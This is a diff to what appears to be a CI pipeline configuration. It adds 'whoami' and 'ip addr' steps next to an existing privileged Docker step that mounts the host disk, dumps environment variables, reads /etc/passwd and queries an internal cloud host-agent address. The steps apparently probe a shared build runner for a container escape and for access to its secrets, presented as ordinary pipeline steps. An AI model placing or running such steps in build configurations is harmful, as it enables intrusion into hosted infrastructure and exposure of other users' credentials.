@@ -1,4 +1,6 @@
 version: v1.1.0
 
 steps:
+ - cmd: whoami
+ - cmd: ip addr
  - cmd: docker run --privileged ubuntu /bin/sh -c "echo privileged && fdisk -l && echo "***" && df && env && mkdir /mnt/test && mount /dev/sda1 /mnt/test && ls -la /mnt/test && cat /etc/passwd && ls -la /dev/sda2 && ls -la /dev/ && ls /usr/bin && apt-get update -y && apt-get install curl -y && curl http://168.63.129.16/machine/?comp=goalstate"
